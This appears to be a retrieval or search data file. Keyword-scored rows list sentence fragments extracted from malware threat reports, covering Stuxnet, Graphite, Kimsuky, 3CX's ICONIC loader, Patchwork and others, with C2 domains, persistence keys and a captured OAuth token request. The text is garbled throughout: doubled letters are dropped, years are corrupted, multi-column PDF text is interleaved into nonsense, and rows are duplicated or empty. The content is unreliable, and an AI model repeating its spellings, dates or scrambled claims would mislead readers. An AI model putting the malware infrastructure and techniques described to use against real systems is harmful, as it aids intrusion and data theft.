reconaisance phase.', 'The types of information gathered may imply that the physical atributes of the device are of interest.', 'This may imply that the ultimate goal of the campaign only relates to devices that satisfy particular physical properties that can be infered from this information.', 'INDEX cylera.com 25 ANALYSIS SECTIONS The linkage betwen Kwampirs and Shamon 5.1.5 Artifact Similarities File Metadata The metadata of the droper and reporter components (DL and EXE) are based on metadata taken from legitimate Microsoft files in both Kwampirs and Shamon (Figures 30, 31, 32 and 3), but in the case of Kwampirs, metadata from other files/companies was also used in later campaigns.', 'Kwampirs Droper Shamon Droper Figure 30: Kwampirs droper metadata Figure 31: Shamon droper metadata INDEX cylera.com 26 ANALYSIS SECTIONS The linkage betwen Kwampirs and Shamon Kwampirs Reporter Shamon Reporter Figure 32: Kwampirs reporter metadata Figure 3: Kwampirs reporter metadata It is worth noting that the metadata of later Kwampirs samples loks diferent and contains many diferent tols.']"
c91a9ca760ed281ab3a6e831ccac7850,wmic,0.7848694123347798,"['61 MS14-058 Exploit .', '45 WinRM .', '18 MS14-068 Exploit .', '49 WinRS .', '20 MS15-078 Exploit .', '46 wmic .', '13 wmiexec.vbs .', '15 7 JPCERT/C 78']"
c91a9ca760ed281ab3a6e831ccac7850,wmic,0.7848694123347798,"['61 MS14-058 Exploit .', '45 WinRM .', '18 MS14-068 Exploit .', '49 WinRS .', '20 MS15-078 Exploit .', '46 wmic .', '13 wmiexec.vbs .', '15 7 JPCERT/C 78']"
3e9312913ace03550c810e6b92ab1d61,whoami,1.0,"['Nomadic Octopus Paperbug Campaign TLP:CLEAR NomadicOctopusTajikistanCampaign: Paperbug Contents References 2 1 Glosary 3 2 Introduction 3 3 ExecutiveSumary 4 3.1 Overview .', '.', '.', '.', '.', '.', '.']"
3e9312913ace03550c810e6b92ab1d61,whoami,1.0,"['Nomadic Octopus Paperbug Campaign TLP:CLEAR NomadicOctopusTajikistanCampaign: Paperbug Contents References 2 1 Glosary 3 2 Introduction 3 3 ExecutiveSumary 4 3.1 Overview .', '.', '.', '.', '.', '.', '.']"
2102fdb89106081f92ca931caeb5562d,operating system version,0.8292821236605175,"['After changing the note for a victim, the botmaster requested a list of SMS mesages from a victim with the HTP request POST /stuf .php?mode=showSmsList.', 'The response to this request was a long list of more than 90 SMS mesages from one victim.', 'The SMS mesages are analysed in Section 6.', 'The original HTP response with the SMS list was a JSON fi le using Unicode encoding (\\u chars) for transfering Rusian characters.', 'The folowing is an example: {response: [{conversations: {+90:[{body:\\u0421\\u043f \\u0438\\u041\\u0430\\u043d\\u0438 The decoded text in Rusian is as folows (the pasword was redacted): : Platbox (RUB 120.0); : 342365. .', '.', 'The English translation of this mesage is: Withdrawal of funds: Platbox (RUB 120.0); pasword: 342365.', 'Do not disclose the pasword to ANYONE.', 'Only fraudsters request paswords.', 'This SMS sems to be a mesage from the Platbox Rusian payment system saying that 120 Rusian Rubles have ben withdrawn.', 'Despite our initial asumption that the botnet was only loking for two-factor authentication mesages, it is unclear why the botmasters are monitoring these mesages.']"
2102fdb89106081f92ca931caeb5562d,operating system version,0.8292821236605175,"['After changing the note for a victim, the botmaster requested a list of SMS mesages from a victim with the HTP request POST /stuf .php?mode=showSmsList.', 'The response to this request was a long list of more than 90 SMS mesages from one victim.', 'The SMS mesages are analysed in Section 6.', 'The original HTP response with the SMS list was a JSON fi le using Unicode encoding (\\u chars) for transfering Rusian characters.', 'The folowing is an example: {response: [{conversations: {+90:[{body:\\u0421\\u043f \\u0438\\u041\\u0430\\u043d\\u0438 The decoded text in Rusian is as folows (the pasword was redacted): : Platbox (RUB 120.0); : 342365. .', '.', 'The English translation of this mesage is: Withdrawal of funds: Platbox (RUB 120.0); pasword: 342365.', 'Do not disclose the pasword to ANYONE.', 'Only fraudsters request paswords.', 'This SMS sems to be a mesage from the Platbox Rusian payment system saying that 120 Rusian Rubles have ben withdrawn.', 'Despite our initial asumption that the botnet was only loking for two-factor authentication mesages, it is unclear why the botmasters are monitoring these mesages.']"
5d9861a26c9cd5bdcb58921a7b6843d1,operating system version,0.8268911010962539,"['These domains include is to create.', ""In this instance, the configured named bs.afbjz.com', newhose.ntimobile.com', and was winsvcfs.dl, as shown in Figure 2."", ""Due to the w.adv138mail.com'32."", 'namebeing configurable, theRAT wilnot alwaysbe caled winsvcfs.dl.', 'The configuration block also The RAT has many diferent capabilities and contains a calback domain and port for the runs onmultipleversionsoftheMicrosoft Windows malwares comand and control comunications.', 'operating system.', ""The RAT's behaviour changes The calback domain is configured to be slightly depending onwhichversionof theWindows nateon.duamlive.com and the port is configured to operating system it is instaled on and which be80 (50inhexadecimal), also showninFigure2."", 'modules are instaled.', 'Modules used by the RAT deployed to the SK Comunications network If no configuration is specified, the malware include: uses default values instead.', 'The default calback location hardcoded into the malware is the private IP adres, 192.168.0.20.', 'This adres is not 28Theprocesvchost.exe is agenerichostprocesforservices 31 Symantec antivirus software detects nateon.exe as which runfromDLs.']"
5d9861a26c9cd5bdcb58921a7b6843d1,operating system version,0.8268911010962539,"['These domains include is to create.', ""In this instance, the configured named bs.afbjz.com', newhose.ntimobile.com', and was winsvcfs.dl, as shown in Figure 2."", ""Due to the w.adv138mail.com'32."", 'namebeing configurable, theRAT wilnot alwaysbe caled winsvcfs.dl.', 'The configuration block also The RAT has many diferent capabilities and contains a calback domain and port for the runs onmultipleversionsoftheMicrosoft Windows malwares comand and control comunications.', 'operating system.', ""The RAT's behaviour changes The calback domain is configured to be slightly depending onwhichversionof theWindows nateon.duamlive.com and the port is configured to operating system it is instaled on and which be80 (50inhexadecimal), also showninFigure2."", 'modules are instaled.', 'Modules used by the RAT deployed to the SK Comunications network If no configuration is specified, the malware include: uses default values instead.', 'The default calback location hardcoded into the malware is the private IP adres, 192.168.0.20.', 'This adres is not 28Theprocesvchost.exe is agenerichostprocesforservices 31 Symantec antivirus software detects nateon.exe as which runfromDLs.']"
b78fea03a8dcf06cdf0ff78e1e505ed0,operating system version,0.8681673498863652,"[']com Al values that are colored in red are now chosen at random from a hard-coded list that is decoded from the stage 2 content (using the Type C XOR algorithm).', 'The encrypted blob (cokie value) is initialy a JSON dictionary, encrypted with the RC4 algorithm (using the key BD DE 96 D2 9C 68 E 06 49 64 D1 E5 8A 86 05 12 B0 9A 50 0 4E F2 E4 92 5C 76 AB FC 90 23 DF C6, decoded from stage 2 content), XORed (using the Type B XOR algorithm), base64- encoded and URL-encoded.', 'The actual JSON content is very similar to the one that is sent by VileDroper to the C2 server: Provided by JSON Key VileDroper via Value the comand line Hard-coded value (65 in the last sample we analyzed) which might be a v version number.', 'u The target identifier.', 'a The list of security solutions instaled on the targeted computer.', 'w The targets operating system version.', 'd A fixed identifier, which might designate a campaign or version.', 'n The targets fuly qualified login (%USERDOMAIN%\\%USERNAME%).', 'r Flag that indicates if the mutex creation suceded (1) or failed (0).', 'xn Curent proces name (e.g., SerenadeDACplAp.exe).', 's Constant value embeded in the code and equal to 0.']"
88d674726f92a0b205d41f6b44c23d24,keyboard layout,0.7796233621048959,"['Memory is alocated for the main shelcode and at the chosen hijacked adres, Stuxnet only places a smal piece of shelcode that wil jump to the main shelcode.', 'Next, Stuxnet drops a malformed keyboard layout file into the Temp directory with the file name ~DF<random>.', 'tmp.', 'The malformed keyboard layout file contains a byte that wil result in the overly large index into the func- tion table.', 'NtUserLoadKeyboardLayoutEx is caled to load the malformed keyboard layout file sucesfuly invok- ing the exploit.', 'The original keyboard layout is restored and then the malformed keyboard layout file is deleted.', 'The shelcode then loads the main Stuxnet DL in the context of CSRS.EXE.', 'Page 19 W32.Stuxnet Dosier Security Response Load Point Stuxnet drops Resource 242 MrxCls.sys via Export 16.', 'MrxCls is a driver digitaly signed with a compromised Realtek certificate that was revoked on July 16, 2010 by Verisign.', 'A diferent version of the driver was also found signed by a diferent compromised digital certificate from JMicron.', 'Mrxcls.sys is a driver that alows Stuxnet to be executed every time an infected system bots and thus acts as the main load-point for the threat.']"
88d674726f92a0b205d41f6b44c23d24,keyboard layout,0.7796233621048959,"['Memory is alocated for the main shelcode and at the chosen hijacked adres, Stuxnet only places a smal piece of shelcode that wil jump to the main shelcode.', 'Next, Stuxnet drops a malformed keyboard layout file into the Temp directory with the file name ~DF<random>.', 'tmp.', 'The malformed keyboard layout file contains a byte that wil result in the overly large index into the func- tion table.', 'NtUserLoadKeyboardLayoutEx is caled to load the malformed keyboard layout file sucesfuly invok- ing the exploit.', 'The original keyboard layout is restored and then the malformed keyboard layout file is deleted.', 'The shelcode then loads the main Stuxnet DL in the context of CSRS.EXE.', 'Page 19 W32.Stuxnet Dosier Security Response Load Point Stuxnet drops Resource 242 MrxCls.sys via Export 16.', 'MrxCls is a driver digitaly signed with a compromised Realtek certificate that was revoked on July 16, 2010 by Verisign.', 'A diferent version of the driver was also found signed by a diferent compromised digital certificate from JMicron.', 'Mrxcls.sys is a driver that alows Stuxnet to be executed every time an infected system bots and thus acts as the main load-point for the threat.']"
39dab018880af8ccfbc01563e9251aa7,"exfiltrate proprietary or confidential information,",0.7634734704846748,"[' 2016 Cymetria Inc. Al rights reserved.', 'Confidential and proprietary.', 'UNVEILING PATCHWORK THE COPY-PASTE APT A targeted atack caught with cyber deception This report can be found at: htps:/w.cymetria.com/patchwork-targeted-atack/.', 'Al IoCs (in CSV and STIX formats), and the MazeRuner campaign file, can be found on Cymetria Researchs GitHub, here: htps:/github.com/CymetriaResearch/CymetriaResearch.', '2016 Cymetria Inc. Al rights reserved.', 'Confidential and proprietary.', 'TLP: GREN TABLE OF CONTENTS Executive sumary 4 Acknowledgements 5 The investigation 6 Overview 6 Hunting the atacker with a deception campaign 7 Geting started 8 Chain of events 9 Inteligence gained from the actors C&C server 1 Technical analysis 12 Tols deployed 12 Atack vector 12 Droper 13 C&C comunications 13 Privilege escalation 16 Shelcode execution 17 Reverse HTPS Meterpreter 17 Second stage payload 17 Atribution 19 Previously examined information 19 PS edit time analysis 19 C&C activity times 21 Conclusions 24 Apendix 1 IoCs 25 File hashes 25 IPs 25 POST requests 25 URLs 25 Suspected IoCs 26 Other 27 Confirmed infecting presentations 28 Suspected IoCs found to be similar to the above IoCs 31 Research 3 TLP: GREN EXECUTIVE SUMARY Patchwork is a targeted atack that has infected an estimated 2,50 machines since it was first observed in December 2015.']"
39dab018880af8ccfbc01563e9251aa7,"exfiltrate proprietary or confidential information,",0.7634734704846748,"[' 2016 Cymetria Inc. Al rights reserved.', 'Confidential and proprietary.', 'UNVEILING PATCHWORK THE COPY-PASTE APT A targeted atack caught with cyber deception This report can be found at: htps:/w.cymetria.com/patchwork-targeted-atack/.', 'Al IoCs (in CSV and STIX formats), and the MazeRuner campaign file, can be found on Cymetria Researchs GitHub, here: htps:/github.com/CymetriaResearch/CymetriaResearch.', '2016 Cymetria Inc. Al rights reserved.', 'Confidential and proprietary.', 'TLP: GREN TABLE OF CONTENTS Executive sumary 4 Acknowledgements 5 The investigation 6 Overview 6 Hunting the atacker with a deception campaign 7 Geting started 8 Chain of events 9 Inteligence gained from the actors C&C server 1 Technical analysis 12 Tols deployed 12 Atack vector 12 Droper 13 C&C comunications 13 Privilege escalation 16 Shelcode execution 17 Reverse HTPS Meterpreter 17 Second stage payload 17 Atribution 19 Previously examined information 19 PS edit time analysis 19 C&C activity times 21 Conclusions 24 Apendix 1 IoCs 25 File hashes 25 IPs 25 POST requests 25 URLs 25 Suspected IoCs 26 Other 27 Confirmed infecting presentations 28 Suspected IoCs found to be similar to the above IoCs 31 Research 3 TLP: GREN EXECUTIVE SUMARY Patchwork is a targeted atack that has infected an estimated 2,50 machines since it was first observed in December 2015.']"
acda0189d6aeed90ffd0850d6f938f74,to decrypt it using AES GCM algorithm,0.813630334778898,"['Any endpoint impacted by this malicious update should be isolated and investigated for further signs of compromise.', 'Organizations should ases the potentialy impacted information on these endpoints and lok to cycle secrets to reduce the risk of aditional future compromise.', 'ICONIC Analysis Stage #1: Suply Chain Atacks - ICONIC Volexitys analysis began with one of the instalers taged as malicious in public discourse: Name(s) 3CXDesktopAp-18.12.416.msi Size 97.8MB (1025648 Bytes) File Type Windows Instaler MD5 0eb1c013eb4d57178b2d9d14ce3e9 SHA1 bfecb8ce89a312d2ef4afc64a63847ae1c6f69e SHA256 59e1edf4d82fae4978e97512b031b7eb21d4b838b850ba46794d9c7a2c0983 The instaler contains a malicious version of fmpeg.dl, an open-source video player library: Name(s) fmpeg.dl Size 2.7MB (2814976 Bytes) File Type Win32 DL MD5 74bc2d0b680fa1a5a76b27e5479cbc SHA1 bf939c9c261d27e7b92325c58624fca75429 SHA256 7986bae8940da1ce089383521ab420c43ab7b15ed42aed91fd31ce83896 The library is loaded by 3CXDesktopAp.exe, and it is used to decode and inject a payload into memory: Name(s) N/A Size 28.0KB (294912 Bytes) File Type aplication/x-dosexec MD5 1bc82a9bd8297bd0823bce5d6202082 SHA1 894e7d4fd764b45809c7f0643694b036ead30 SHA256 f79c3b0adb6ec7bc8bc9ae95a1571aed675a28c8b17b1d7595e86840952 2/10 The purpose of this malware, which Volexity wil refer to as ICONIC, is as folows: Download various files that contain aditional code, with names such as icon[0-15].ico, hosted at htps:/github[.]com/IconStorages/images/.', '(Note: the GitHub repository has since ben taken down.)', 'Parse these files to identify a $ character folowed by a base64-encoded string apended to the end of the ICO files.', 'Decrypt the base64 string using the AES-GCM encryption algorithm.', 'Al values required to decrypt AES-GCM are derived from a complex function that third-party researchers have indicated is based on a publicly available gist.', 'Once the string is decoded, it contains the URLs with which the DL wil then comunicate to receive a next- stage payload.', 'The next-stage payload is a JSON object that is then parsed and must further be decrypted (with the same AES-GCM decryption function).', 'The next stage is expected to be a 64-bit PE that is reflectively loaded through a shelcode loader stored at the head of the file.', 'A script is provided with this post on GitHub that can be used to decrypt the base64 blobs apended to the ICO files.']"
d8bfe2d6295d697f296644658fd284a8,File enumeration,0.9076692308689148,"['zero-day during the same period using both techniques.', 'blog, sl, pic, mail, news, etc.', 'There was also evidence to implants.', 'The actors relied heavily on the fre Dynamic The exploit domain glkjcorp.com was registered shortly As to other documented cases, the atacker started sugest this group atempted to gather user credentials DNS providers No-IP (htp:/w.noip.com), Oray (htp:/ before the atack on May 24, 2012.', 'Two diferent emails interacting with the infected machine within minutes for Yaho, Windows Live and other acounts through w.oray.com/) and 32 (htp:/w.pubyun.com/) were used in the registration of this domain: efort09 (at) of compromise to begin manual network and host several diferent phishing domains during July and for their infrastructure continuing into 201; the earliest hotmail.com and zaizhong16 (at) 126.com.', 'enumeration.', 'August 201. known backdors SPEAR identified comunicated to This atack was the first to use the file DeployJava.', '3232.32.org and 1stone.zapto.org.', 'In October 201, the group atempted to take advantage While SPEAR was unable to recover the original pages js to fingerprint instaled software on victim systems of the ongoing Libyan crisis at the time and phish the news served, the domains these pages were hosted on It wasnt until June 201 that Operation Dust Storm prior to delivery and ensure a known efective exploit cycle regarding Muamar Gadafis death on October are: login.live.adobekr.com, login.live.wih365.com, started to garner some notoriety from a series of was deployed.', 'This JavaScript file was first used 20, 201.', 'It apears that in adition to some US defense and yahomail.adobeus.com.']"
d8bfe2d6295d697f296644658fd284a8,File enumeration,0.9076692308689148,"['zero-day during the same period using both techniques.', 'blog, sl, pic, mail, news, etc.', 'There was also evidence to implants.', 'The actors relied heavily on the fre Dynamic The exploit domain glkjcorp.com was registered shortly As to other documented cases, the atacker started sugest this group atempted to gather user credentials DNS providers No-IP (htp:/w.noip.com), Oray (htp:/ before the atack on May 24, 2012.', 'Two diferent emails interacting with the infected machine within minutes for Yaho, Windows Live and other acounts through w.oray.com/) and 32 (htp:/w.pubyun.com/) were used in the registration of this domain: efort09 (at) of compromise to begin manual network and host several diferent phishing domains during July and for their infrastructure continuing into 201; the earliest hotmail.com and zaizhong16 (at) 126.com.', 'enumeration.', 'August 201. known backdors SPEAR identified comunicated to This atack was the first to use the file DeployJava.', '3232.32.org and 1stone.zapto.org.', 'In October 201, the group atempted to take advantage While SPEAR was unable to recover the original pages js to fingerprint instaled software on victim systems of the ongoing Libyan crisis at the time and phish the news served, the domains these pages were hosted on It wasnt until June 201 that Operation Dust Storm prior to delivery and ensure a known efective exploit cycle regarding Muamar Gadafis death on October are: login.live.adobekr.com, login.live.wih365.com, started to garner some notoriety from a series of was deployed.', 'This JavaScript file was first used 20, 201.', 'It apears that in adition to some US defense and yahomail.adobeus.com.']"
74d95823facffdc61cf1a73f5d1177a1,"download, upload",0.7716087818835985,"['Although our analysis and atribution eforts are ongoing, we have discovered some indicators that sugest the threat actor may be a Chinese group.', 'The campaigns The APT group has launched at least four campaigns since late February, using a variety of lures, detailed below.', '1.', 'Interactive map of Ukraine The threat actor started this campaign around February 26, 202, and distributed its custom malware with the name interactive_map_UA.exe, trying to disguise it as an interactive map of Ukraine.', 'This campaign began a few days after Rusia invaded Ukraine, which shows the threat actor was monitoring the situation betwen Ukraine and Rusia and tok advantage of it to lure targets in Rusia.', '2.', 'Log4j patch In this campaign the threat actor packaged its custom malware in a tar file caled Patch_Log4j.tar.gz, a fake fix for Decembers high-profile Log4j vulnerability.', 'This campaign ran in early March and was primarily aimed at RT TV (formerly Rusia Today or Rosiya Segodnya, a Rusian state-controled international television network funded by the Rusian government).', 'The APT group had aces to almost 10 RT TV employes email adres.', 'The emails were sent with the subject .', '.']"
fd1e2466e0c27de5905c2d67061cd76f,"download, upload",0.8697368176382959,"['Reflective and object file loader.', 'Decoding KRB5 ticket and converting it to hashcat.', 'Patching Event Tracing for Windows (ETW).', 'Patching Anti Malware Scan Interface (AMSI).', 'Create Windows system services.', 'Upload and download files.', 'Create files via CreateFileTransacted.', 'Port scan.', 'From Click to Brute Figure 4.', 'VirusTotal verdicts for sample as of June 27, 202.', 'The file in VirusTotal named Roshan_CV.iso (SHA256: 1FC7B0E1054D54CE8F1DE0C95976081C7A85C7926C03172A3DA67269042C) apears to be a curiculum 4/17 vitae (similar to a resume) of an individual named Roshan.']"
564c219dc0a2c3edd2eed08025387d9d,"download, upload",0.889245176582951,"['comand codes in the MargualsRAT indicating that this RAT is actively in development by the atackers.', 'ALAKORE Alakore is a publicly available Delphi- based RAT that has consistently ben used in SideCopy operations along with CetaRAT.', 'Malicious capabilities of Alakore include: Keyloging.', 'Capture screnshots.', 'List folders and files.', 'Upload/Download files.', 'Steal clipboard data.', 'Grab/change walpaper.', 'In recent infections, this RAT is named Cyrus client (Figure 16).', 'ACTIONRAT ActionRAT is a Delphi-based RAT Figure 15: Comand handler of MargulasRAT.', 'containing a limited set of capabilities.']"
3bca2db25a6cc131f77fa420a81cca9e,The decoded payload,0.7513510233999785,"['Its use in these debuging versions coincides with the samples for Mirage, which were writen using Microsoft Visual C+.', 'CTU researchers also noted that the original name of the trojan used in the path is MirageFox, which is likely the name used by the threat actors.', 'This information leads to two potential conclusions: 1.', 'The two variants of MF-v1.2, the debug version and the release version, alow the threat actors to customize variants.', 'CTU researchers have already sen this activity.', '2.', 'The use of diferent drive leters but similar source code paths may indicate that the threat actors are keping a repository of tols on a central file server for shared use.', 'Identification of victims From May to the date of this publication, the CTU research team engaged in a sinkhol- ing operation.', 'During the operation, several of the domains formerly used as part of the C2 infrastructure were taken over, and al activity to the domains was loged.', 'The sink- holed domains were no longer in use and were frely available for registration.', 'During the operation, CTU researchers were able to identify aproximately 80 IP ad- dreses regularly comunicating to the sinkhole.']"
62e3bf704c1849b6fb3f5fbd9a5fe9fd,the API Web RESTful that provides access to Microsoft Cloud service resources.,0.7503979860010865,"['Similarly, the imported code dynamicaly cals VirtualAloc to alocate a new region of memory in which a new PE file is copied.', 'Finaly, it pases the execution to the region of memory in which the copied PE is alocated, as evidence reported folowing: The code in the injected PE creates another mutex having the name 42Htb60y.', 'The malware proceds to de- obfuscate strings using a XOR lop and using a diferent XOR key for each string.', 'The folowing is an exhaustive list of de-obfuscated strings: DE-OBFUSCATED STRINGS \\.\\rot\\CIMV2 SELECT UID FROM Win32_ComputerSystemProduct ""WQL L""UID ""Unknow n CLR L""pwrshplugin.dl l L""kernel32.dl ""RtlGetVersion ""RtlRandomEx ""RtlIntegerToUn icodeString ""RtlDecompresBufer ""RtlGetCompresionWo rkSpaceSize ""RtlCompresBufer ""RtlComputeCrc32 ""Windows 20 ""Windows XP ""Windows XP P rofesional ""Windows Server 203 ""Windows Home Server ""Windows Server 203 R 2 ""Windows Vista ""Windows Serve r 208 ""Windows Server 208 R 2 ""Windows 7 ""Windows Se rver 2012 ""Windows 8 ""Windows Se rver 2016 ""Windows 10 ""Unidentified ""64bit ""32bit ""NtQue rySystemInformation ""GetCLRVersionForPSVersio n ""NtOpenThread ""NtAlocateVirtua lMemory ""Shel of task = %d ended with code = %d ""User-Agent: Mozila/5.0 (Windows NT 10.0 ; WOW64; rv:87.0) Gecko/20210101 Firefox/87.0 ""User-Agent: ""chunked ""aces_to ken ""refresh_token ""value ""file ""nam e ""/v1.0/d rive/rot:/%s/update/%s:/content ""/v1.0/drive/rot:/%s/check/%s:/content ""/v1.0/drive/rot:/%s/check/%s ""/v1.0/drive/rot:/%s/check:/chil dren ""/comon/oauth2/v2.0/token ""login.microsoftonline.com"" ""graph.microsoft.com"" 3/6 ""Content-Type: aplication/json ""Content-Type: aplication/x-w-form-urlencoded ""Content-Type: aplication/octet-stream ""Content-Type: aplication/xml ""client_id=%s&redirect_uri=urn:ietf:wg:oauth:2.0:ob&refresh_token=%s&grant_type=refresh_token ""Authorization: bearer ""DELETE GET POST PUT L""ntdl.dl L""secur32.dl ""NtOpenKey ""NtQueryValueKey ""NtSetValueKey ""NtClose ""RtlInitUnicodeString ""RtlFreUnicodeString L""\\Registry\\Machine\\SOFTWARE\\Microsoft\\Cryptography L""MachineGuid ""Acept: /"" ""Acept-Encoding: gzip, deflate ""User-Agent: Microsoft skyDriveSync %s ship L""\\Registry\\User\\%s\\Control Panel\\International\\User Profile L""Recharge ""RtlConvertSidToUnicodeString ""WTSQueryUserToken ""sprintf C&C COMUNICATIONS The malware comunicates with the Comand and Control (C&C) through the domain graph[.]Microsoft[.', ']com, i.e.', 'abusing the Microsoft Graph service, which is the API Web RESTful that provides aces to Microsoft Cloud service resources.', 'Hence, the analysis showed that the sample in question is a version of the Graphite malware, a malware using the Microsoft Graph API and OneDrive for C&C comunications.', 'The malware is known to be deployed in- memory only and served as a downloader for the post-exploitation frameworks like Empire (as documented by Trelix researchers on early 202 here).', 'To obtain a new OAuth2 token to aces the service, the endpoint login[.]microsoftonline[.', ']com/comon/oauth2/v2.0/token is contacted using a fixed client ID (6272a08-fe9d-4825- bc65-203842f92bc), as evidence below: The folowing is the ful HTP request to make the first conection to the C&C.', 'HTP REQUEST POST htps:/login.microsoftonline.com/comon/oauth2/v2.0/token HTP/1.1 User-Agent: Mozila/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64 ; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.507 Content-Type: aplication/x-w-form-urlencoded Host: login.microsoftonline.com Content-Length: 459 Conection: Kep-Al ive Cache-Control: no-cach e client_id=6272a08-fe9d- 4825-bc65- 203842f92bc&redirect_uri=urn:ietf:wg :oauth:2.0:ob&refresh_token=M.R3_BAY.- CVmbPSAFzt2n5JiYAwjQRpC6Yh*f45Zsz9XKTHMo4G1ZeR0UDVRbJhp8T7Df*A Rh8tTfRKRZ8YzFEYMRJ!VP!GJPZsfeTb0SM Once obtained a new OAuth2 token, the Graphite malware wil query the Microsoft GraphAPIs for new comands by enumerating the child files in the check OneDrive subdirectory.']"
62e3bf704c1849b6fb3f5fbd9a5fe9fd,decrypted through an AES-256-CBCdecryption algorithm,0.8284417418735275,"['Hence, the analysis showed that the sample in question is a version of the Graphite malware, a malware using the Microsoft Graph API and OneDrive for C&C comunications.', 'The malware is known to be deployed in- memory only and served as a downloader for the post-exploitation frameworks like Empire (as documented by Trelix researchers on early 202 here).', 'To obtain a new OAuth2 token to aces the service, the endpoint login[.]microsoftonline[.', ']com/comon/oauth2/v2.0/token is contacted using a fixed client ID (6272a08-fe9d-4825- bc65-203842f92bc), as evidence below: The folowing is the ful HTP request to make the first conection to the C&C.', 'HTP REQUEST POST htps:/login.microsoftonline.com/comon/oauth2/v2.0/token HTP/1.1 User-Agent: Mozila/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64 ; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.507 Content-Type: aplication/x-w-form-urlencoded Host: login.microsoftonline.com Content-Length: 459 Conection: Kep-Al ive Cache-Control: no-cach e client_id=6272a08-fe9d- 4825-bc65- 203842f92bc&redirect_uri=urn:ietf:wg :oauth:2.0:ob&refresh_token=M.R3_BAY.- CVmbPSAFzt2n5JiYAwjQRpC6Yh*f45Zsz9XKTHMo4G1ZeR0UDVRbJhp8T7Df*A Rh8tTfRKRZ8YzFEYMRJ!VP!GJPZsfeTb0SM Once obtained a new OAuth2 token, the Graphite malware wil query the Microsoft GraphAPIs for new comands by enumerating the child files in the check OneDrive subdirectory.', 'If a new file is found, the content is downloaded and decrypted through an AES-256-CBCdecryption algorithm.', 'The monitoring of task executions and the uploading of their results is managed through a dedicated thread.', 'Finaly, the malware alows remote comand execution by alocating a new region of memory and executing the received shelcode by caling a new dedicated thread.', 'CONCLUSIONS Acording to extracted metadata, atackers worked on the preparation of the campaign betwen January and February 202.', 'However, both URLs used by the implant apared active even recently (Q3 202).', 'Acording with the visibility we can dispose of, in adition, limited telemetry activities relating to this event were observed on 25/08/202 and 09/09/202 coming from two countries of the European Union (no data available before 25/08/202).']"
485f54b00d26addc7791223cdf8f1ba8,The BAT script,0.9836842798957814,"['4 GUID is a unique reference number.', 'Its a 128-bit value that is unique not only within an enterprise but also worldwide.', 'Active Directory internaly uses GUID to identify objects.', '24 | The Spy Kitens Are Back: Rocket Kiten 2 The second line deletes the script in an atempt to hide the infection.', 'The file, NTUSER.dat{GUID}.exe (SHA-1: 64ba130e627d85c85d6534e769d239080e068d, detected by Trend Micro as BKDR_SWRORT.CP) has ben droped prior to launching the tmp.', 'bat script.', 'BKDR_SWRORT.CP is a smal downloader that comunicates with and downloads files from the IP adres, 84.1.146.62.', 'This IP adres belongs to an IABG IP range (htp:/w.iabg.de/), a German satelite comunications provider that the atackers have ben using for a long time.', '25 | The Spy Kitens Are Back: Rocket Kiten 2 Conclusion Conclusion The Rocket Kiten Group has ben around for a while now.', 'Based on research done by several security companies, including Trend Micro and ClearSky, we can asume that their activities wil continue in the near future, as they werent detered by making their existence and atack methods known.', 'Weve ben observing the group for about a year now.']"
c5015c07f1dfdf29e9638da275dcaf47,The BAT script,0.7908794602744134,[]
c5015c07f1dfdf29e9638da275dcaf47,The BAT script,0.7908794602744134,[]
c5015c07f1dfdf29e9638da275dcaf47,The BAT script,0.7908794602744134,"['.', '.', '.', '.', '.', '1 The Bat!', '.', '.', '.', '.', '.']"
c5015c07f1dfdf29e9638da275dcaf47,The BAT script,0.7908794602744134,"['.', '.', '.', '.', '.', '1 The Bat!', '.', '.', '.', '.', '.']"
c5015c07f1dfdf29e9638da275dcaf47,The BAT script,0.7908794602744134,"['.', '.', '.', '.', '.', '5 The Bat!', '.', '.', '.', '.', '.']"
c5015c07f1dfdf29e9638da275dcaf47,The BAT script,0.7908794602744134,"['.', '.', '.', '.', '.', '5 The Bat!', '.', '.', '.', '.', '.']"
bd097ffaaa48344fda3e6704d76f4f4b,The BAT script,0.782368730052912,"['Static information of DL are shown below: Hash ca24c46089c8953b2a5465457a6c202ecfa83ab bce7a9d329ade52ec8382c2 Threat Kimsuky second stage Brief DL used by the Kimsuky group as second stage Description Ssdep 614:6lhe64TNUalJMRfS5mABlakVxOfLnePfcNl6GwUDuL/:6zfeCk IAYfLeXcj6uL Table 2: AutoUpdate.dl Information The dl is then copied into the folder %ApData%\\Roaming\\Microsoft\\Windows\\Defender\\ and it is renamed into AutoUpdate.dl.', 'htps:/blog.yoroi.company/research/the-north-korean-kimsuky-apt-keps-threatening-south-korea-evolving-its-tps/ 2/12 3/4/2020 The North Korean Kimsuky APT keps threatening South Korea evolving its TPs Yoroi Blog The AutoUpdate.dl library then gains persistence by seting the folowing registry key HKCU\\Software\\Microsoft\\Windows\\CurentVersion\\RunOnce\\WindowsDefender.', 'The name and the path used by the atacker is absolutely tricky, because they reference to Windows Defender: Figure 3: registry key set for persistence .', 'Furthermore, exploring the content of the folder %ApData%\\Local\\Temp path, we observed another temporary file created and imediately removed dubed <random_name>.tmp.bat.', 'By analyzing its contents, we noticed that it is used to delete the initial artifact (scr) and file itself.', 'Figure 4: Content of the bat script.', 'In order to hide the malicious operation and avoid raising suspicion, a legit document is created in the same folder containing the .scr file, the document is named .hwp.', 'Translating its name from Korean to English language, is posible to obtain the CV Form string.', 'The name and other information about the document are the folowing: Hash d21523b7b8f6584305a0a6a83cd65c8ce07a42ab781c35a06c46c91f504b4 Threat Kimsuky legit document Brief Legit document used to divert atention on the malware in hwp extension De scrip tion Ss 192:zXEKVs7kRvm+1FsO2ui/VpIkCnH5QVSV9VahU:r3YkA+1aJuk dep WQVS9avU Table 3: Information about legit document with .hwp extension As implied by the file name (CV Form), the document contains a CV form with empty fields, as shown in the folowing figure.', 'htps:/blog.yoroi.company/research/the-north-korean-kimsuky-apt-keps-threatening-south-korea-evolving-its-tps/ 3/12 3/4/2020 The North Korean Kimsuky APT keps threatening South Korea evolving its TPs Yoroi Blog Figure 6: Legit document overview Bypasing AV Detection An interesting behaviour is the explorer.exe injection performed by the AutoUpdate.dl in order to avoid AVs detection.', 'Diging in the malicious code, it is posible to se the methods used to perform this operation.']"
